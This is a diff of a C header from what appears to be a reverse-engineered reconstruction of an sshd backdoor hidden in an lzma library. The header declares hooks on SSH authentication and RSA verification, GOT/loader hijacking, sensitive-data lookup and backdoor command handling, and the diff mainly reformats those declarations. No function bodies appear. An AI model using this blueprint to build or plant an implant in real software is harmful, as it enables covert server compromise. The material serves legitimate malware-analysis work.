 extern BOOL find_mov_lea_instruction(
  u8 *code_start,
  u8 *code_end,
@@ -1464,6 +1442,7 @@ extern BOOL find_mov_lea_instruction(
  BOOL load_flag,
  dasm_ctx_t *dctx
 );
+
 extern BOOL find_mov_instruction(
  u8 *code_start,
  u8 *code_end,
@@ -1471,6 +1450,7 @@ extern BOOL find_mov_instruction(
  BOOL load_flag,
  dasm_ctx_t *dctx
 );
+
 extern BOOL find_instruction_with_mem_operand_ex(
  u8 *code_start,
  u8 *code_end,
@@ -1478,20 +1458,26 @@ extern BOOL find_instruction_with_mem_operand_ex(
  int opcode,
  void *mem_address
 );
+
 extern BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part);
+
 extern u8 *find_string_reference(
  u8 *code_start,
  u8 *code_end,
  const char *str
 );
+
 extern u8 *elf_find_string_reference(
  elf_info_t *elf_info,
  EncodedStringId encoded_string_id,
  u8 *code_start,
  u8 *code_end
 );
+
 extern BOOL find_reg2reg_instruction(u8 *code_start, u8 *code_end, dasm_ctx_t *dctx);
+
 extern BOOL find_function_prologue(u8 *code_start, u8 *code_end, u8 **output, FuncFindType find_mode);
+
 extern BOOL find_function(
  u8 *code_start,
  void **func_start,
@@ -1499,147 +1485,218 @@ extern BOOL find_function(
  u8 *search_base,
  u8 *code_end,
  FuncFindType find_mode);
+
 extern BOOL elf_contains_vaddr(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);
+
 extern BOOL elf_contains_vaddr_impl(elf_info_t *elf_info, void *vaddr, u64 size, u32 p_flags);
+
 extern BOOL elf_contains_vaddr_relro(elf_info_t *elf_info, u64 vaddr, u64 size, u32 p_flags);
+
 extern BOOL elf_parse(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
+
 extern BOOL is_gnu_relro(Elf64_Word p_type, u32 addend);
+
 extern BOOL main_elf_parse(main_elf_t *main_elf);
+
 extern char *check_argument(char arg_first_char, char* arg_name);
+
 extern BOOL process_is_sshd(elf_info_t *elf, u8 *stack_end);
+
 extern BOOL elf_find_string_references(elf_info_t *elf_info, string_references_t *refs);
+
 extern Elf64_Sym *elf_symbol_get(elf_info_t *elf_info, EncodedStringId encoded_string_id, EncodedStringId sym_version);
+
 extern void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+
 extern void *elf_get_code_segment(elf_info_t *elf_info, u64 *pSize);
+
 extern void *elf_get_rodata_segment(elf_info_t *elf_info, u64 *pSize);
+
 extern void *elf_get_data_segment(elf_info_t *elf_info, u64 *pSize, BOOL get_alignment);
+
 extern void *elf_get_reloc_symbol(
  elf_info_t *elf_info,
  Elf64_Rela *relocs,
  u32 num_relocs,
  u64 reloc_type,
  EncodedStringId encoded_string_id);
+
 extern void *elf_get_plt_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+
 extern void *elf_get_got_symbol(elf_info_t *elf_info, EncodedStringId encoded_string_id);
+
 extern Elf64_Rela *elf_find_rela_reloc(
  elf_info_t *elf_info,
  EncodedStringId encoded_string_id,
  u64 reloc_type);
+
 extern Elf64_Relr *elf_find_relr_reloc(
  elf_info_t *elf_info,
  EncodedStringId encoded_string_id);
+
 extern BOOL elf_find_function_pointer(
  StringXrefId xref_id,
  void **pOutCodeStart, void **pOutCodeEnd,
  void **pOutFptrAddr, elf_info_t *elf_info,
  string_references_t *xrefs,
  global_context_t *ctx);
+
 extern char *elf_find_string(
  elf_info_t *elf_info,
  EncodedStringId *stringId_inOut,
  void *rodata_start_ptr);
+
 extern lzma_allocator *get_lzma_allocator(void);
+
 extern fake_lzma_allocator_t *get_lzma_allocator_address(void);
+
 extern void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size);
+
 extern void fake_lzma_free(void *opaque, void *ptr);
+
 extern elf_functions_t *get_elf_functions_address(void);
+
 extern BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor);
+
 extern BOOL secret_data_append_from_code(
  void *code_start,
  void *code_end,
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, BOOL start_from_call);
+
 extern BOOL secret_data_append_item(
  secret_data_shift_cursor_t shift_cursor,
  unsigned operation_index,
  unsigned shift_count,
  int index, u8 *code);
+
 extern BOOL secret_data_append_items(
  secret_data_item_t *items,
  u64 items_count,
  BOOL (*appender)(secret_data_shift_cursor_t, unsigned, unsigned, int, u8 *));
+
 extern BOOL secret_data_append_from_address(
  void *addr,
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, unsigned operation_index);
+
 extern BOOL secret_data_append_singleton(
  u8 *call_site, u8 *code,
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, unsigned operation_index);
+
 extern BOOL secret_data_append_from_call_site(
  secret_data_shift_cursor_t shift_cursor,
  unsigned shift_count, unsigned operation_index,
  BOOL bypass
 );
+
 extern BOOL backdoor_setup(backdoor_setup_params_t *params);
+
 extern void init_ldso_ctx(ldso_ctx_t *ldso_ctx);
+
 extern unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame);
+
 extern void * backdoor_init(elf_entry_ctx_t *state, u64 *caller_frame);
+
 extern void init_elf_entry_ctx(elf_entry_ctx_t *ctx);
+
 extern void update_got_offset(elf_entry_ctx_t *ctx);
+
 extern void update_cpuid_got_index(elf_entry_ctx_t *ctx);
+
 extern BOOL backdoor_init_stage2(elf_entry_ctx_t *ctx, u64 *caller_frame, void **cpuid_got_addr, backdoor_cpuid_reloc_consts_t* reloc_consts);
+
 extern BOOL resolve_libc_imports(
  struct link_map *libc,
  elf_info_t *libc_info,
  libc_imports_t *imports
 );
+
 extern BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data);
+
 extern BOOL process_shared_libraries_map(struct link_map *r_map, backdoor_shared_libraries_data_t *data);
+
 extern BOOL chacha_decrypt(
  u8 *in, int inl,
  u8 *key, u8 *iv,
  u8 *out, imported_funcs_t *funcs
 );
+
 extern BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx);
+
 extern BOOL is_range_mapped(u8* addr, u64 length, global_context_t* ctx);
+
 extern u32 count_bits(u64 x);
+
 extern EncodedStringId get_string_id(const char *string_begin, const char *string_end);
+
 extern unsigned int _get_cpuid_modified(unsigned int leaf, unsigned int *eax, unsigned int *ebx, unsigned int *ecx, unsigned int *edx, u64 *caller_frame);
+
 extern void _cpuid_gcc(unsigned int level, unsigned int *a, unsigned int *b, unsigned int *c, unsigned int *d);
+
 extern int init_hooks_ctx(backdoor_hooks_ctx_t *ctx);
+
 extern int init_shared_globals(backdoor_shared_globals_t *shared_globals);
+
 extern BOOL init_imported_funcs(imported_funcs_t *imported_funcs);
+
 extern void *update_got_address(elf_entry_ctx_t *entry_ctx);
+
 extern ptrdiff_t get_tls_get_addr_random_symbol_got_offset(elf_entry_ctx_t *ctx);
+
+/*
+ * Standard glibc TLS index pair (module + offset) used when calling the loader’s `__tls_get_addr` trampoline from within the implant.
+ */
 typedef struct dl_tls_index
 {
  uint64_t ti_module;
  uint64_t ti_offset;
 } tls_index;
+
 extern void *__tls_get_addr(tls_index *ti);
+
 extern void *dummy_tls_get_addr (tls_index *ti);
+
 extern void *j_tls_get_addr(tls_index *ti);
+
 extern uintptr_t backdoor_symbind64(
  Elf64_Sym *sym,
  unsigned int ndx,
  uptr *refcook, uptr *defcook,
  unsigned int flags,
  const char *symname);
+
 extern BOOL run_backdoor_commands(RSA *key, global_context_t *ctx, BOOL *do_orig);
+
 extern BOOL find_dl_audit_offsets(
  backdoor_data_handle_t *data,
  ptrdiff_t *libname_offset,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
+
 extern BOOL find_link_map_l_name(
  backdoor_data_handle_t *data_handle,
  ptrdiff_t *libname_offset,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
+
 extern BOOL find_dl_naudit(
  elf_info_t *dynamic_linker_elf,
  elf_info_t *libcrypto_elf,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
+
 extern BOOL find_link_map_l_audit_any_plt(
  backdoor_data_handle_t *data,
  ptrdiff_t libname_offset,
  backdoor_hooks_data_t *hooks,
  imported_funcs_t *imported_funcs);
+
 extern BOOL find_link_map_l_audit_any_plt_bitmask(
  backdoor_data_handle_t *data,
  instruction_search_ctx_t *search_ctx);
+
 extern BOOL sshd_get_sensitive_data_address_via_xcalloc(
  u8 *data_start,
  u8 *data_end,
@@ -1647,6 +1704,7 @@ extern BOOL sshd_get_sensitive_data_address_via_xcalloc(
  u8 *code_end,
  string_references_t *string_refs,
  void **sensitive_data_out);
+
 extern BOOL sshd_get_sensitive_data_address_via_krb5ccname(
  u8 *data_start,
  u8 *data_end,
@@ -1654,44 +1712,54 @@ extern BOOL sshd_get_sensitive_data_address_via_krb5ccname(
  u8 *code_end,
  void **sensitive_data_out,
  elf_info_t *elf);
+
 extern int sshd_get_sensitive_data_score_in_demote_sensitive_data(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
+
 extern int sshd_get_sensitive_data_score_in_main(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
+
 extern int sshd_get_sensitive_data_score_in_do_child(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
+
 extern int sshd_get_sensitive_data_score(
  void *sensitive_data,
  elf_info_t *elf,
  string_references_t *refs);
+
 extern BOOL bignum_serialize(
  u8 *buffer, u64 bufferSize,
  u64 *pOutSize,
  const BIGNUM *bn,
  imported_funcs_t *funcs);
+
 extern BOOL sshbuf_bignum_is_negative(struct sshbuf *buf);
+
 extern BOOL rsa_key_hash(
  const RSA *rsa,
  u8 *mdBuf,
  u64 mdBufSize,
  imported_funcs_t *funcs);
+
 extern BOOL dsa_key_hash(
  const DSA *dsa,
  u8 *mdBuf,
  u64 mdBufSize,
  global_context_t *ctx);
+
 extern BOOL sha256(
  const void *data,
  size_t count,
  u8 *mdBuf,
  u64 mdBufSize,
  imported_funcs_t *funcs);
+
 extern BOOL verify_signature(
  struct sshkey *sshkey,
  u8 *signed_data,
@@ -1701,6 +1769,7 @@ extern BOOL verify_signature(
  u8 *ed448_raw_key,
  global_context_t *global_ctx
 );
+
 extern BOOL sshd_patch_variables(
  BOOL skip_root_patch,
  BOOL disable_pam,
@@ -1708,17 +1777,20 @@ extern BOOL sshd_patch_variables(
  int monitor_reqtype,
  global_context_t *global_ctx
 );
+
 extern BOOL sshd_find_monitor_struct(
  elf_info_t *elf,
  string_references_t *refs,
  global_context_t *ctx
 );
+
 extern BOOL sshd_find_main(
  u8 **code_start_out,
  elf_info_t *sshd,
  elf_info_t *libcrypto,
  imported_funcs_t *imported_funcs
 );
+
 extern BOOL sshd_find_monitor_field_addr_in_function(
  u8 *code_start,
  u8 *code_end,
@@ -1727,12 +1799,14 @@ extern BOOL sshd_find_monitor_field_addr_in_function(
  void **monitor_field_ptr_out,
  global_context_t *ctx
 );
+
 extern void *find_addr_referenced_in_mov_instruction(
  StringXrefId id,
  string_references_t *refs,
  void *mem_range_start,
  void *mem_range_end
 );
+
 extern BOOL validate_log_handler_pointers(
  void *addr1,
  void *addr2,
@@ -1741,115 +1815,146 @@ extern BOOL validate_log_handler_pointers(
  string_references_t *refs,
  global_context_t *global
 );
+
+/*
+ * Direction selector the socket helpers use to know whether we should fetch the readable or writable monitor file descriptor.
+ */
 enum SocketMode {
  DIR_WRITE = 0,
  DIR_READ = 1
 };
+
 extern BOOL sshd_get_client_socket(
  global_context_t *ctx,
  int *pSocket,
  int socket_index,
  enum SocketMode socket_direction
 );
+
 extern BOOL sshd_get_usable_socket(int *pSock, int socket_index, libc_imports_t *imports);
+
 extern BOOL sshd_get_sshbuf(struct sshbuf *sshbuf, global_context_t *ctx);
+
 extern BOOL sshbuf_extract(struct sshbuf *buf, global_context_t *ctx, void **p_sshbuf_d, size_t *p_sshbuf_size);
+
 extern BOOL extract_payload_message(
  struct sshbuf *sshbuf_data,
  size_t sshbuf_size,
  size_t *out_payload_size,
  global_context_t *ctx);
+
 extern BOOL decrypt_payload_message(
  key_payload_t *payload,
  size_t payload_size,
  global_context_t *ctx);
+
 extern BOOL check_backdoor_state(global_context_t *ctx);
+
 extern int mm_answer_keyallowed_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+
 extern int mm_answer_keyverify_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+
 extern int mm_answer_authpassword_hook(struct ssh *ssh, int sock, struct sshbuf *m);
+
 extern void mm_log_handler_hook(
  LogLevel level,
  int forced,
  const char *msg,
  void *ctx);
+
 extern ssize_t fd_read(
  int fd,
  void *buffer,
  size_t count,
  libc_imports_t *funcs);
+
 extern ssize_t fd_write(
  int fd,
  void *buffer,
  size_t count,
  libc_imports_t *funcs);
+
 extern BOOL contains_null_pointers(
  void **pointers,
  unsigned int num_pointers
 );
+
 extern BOOL count_pointers(
  void **ptrs,
  u64 *count_out,
  libc_imports_t *funcs
 );
+
 extern BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags, global_context_t *ctx);
+
 extern int hook_RSA_public_decrypt(
  int flen, unsigned char *from,
  unsigned char *to, RSA *rsa, int padding);
+
 extern int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey, RSA *key);
+
 extern void hook_RSA_get0_key(
  const RSA *r,
  const BIGNUM **n,
  const BIGNUM **e,
  const BIGNUM **d);
+
 extern void sshd_log(
  sshd_log_ctx_t *log_ctx,
  LogLevel level, const char *fmt, ...);
+
 extern BOOL sshd_find_sensitive_data(
  elf_info_t *sshd,
  elf_info_t *libcrypto,
  string_references_t *refs,
  imported_funcs_t *funcs,
  global_context_t *ctx);
+
 extern ssize_t c_strlen(
  char *str
 );
+
 extern ssize_t c_strnlen(
  char *str,
  size_t max_len
 );
+
 extern void* c_memmove(
  char *dest,
  char *src,
  size_t cnt
 );
+
 extern u32 resolver_call_count;
-;
+
 extern global_context_t *global_ctx;
-;
+
 extern backdoor_hooks_data_t *hooks_data;
-;
+
 extern backdoor_hooks_data_t *hooks_data_addr;
-;
+
 extern const ptrdiff_t fake_lzma_allocator_offset;
-;
+
 extern fake_lzma_allocator_t fake_lzma_allocator;
-;
+
 extern void *lzma_alloc(size_t size, lzma_allocator *allocator);
+
 extern void lzma_free(void *ptr, lzma_allocator *allocator);
+
 extern void lzma_check_init(lzma_check_state *state, lzma_check check_id);
+
 extern const ptrdiff_t elf_functions_offset;
-;
+
 extern const elf_functions_t elf_functions;
-;
+
 extern const u64 cpuid_random_symbol;
-;
+
 extern const u64 tls_get_addr_random_symbol;
-;
+
 extern const backdoor_cpuid_reloc_consts_t cpuid_reloc_consts;
-;
+
 extern const backdoor_tls_get_addr_reloc_consts_t tls_get_addr_reloc_consts;
-;
+
 extern const u64 string_mask_data[238];
-;
+
 extern const u32 string_action_data[1304];
-;
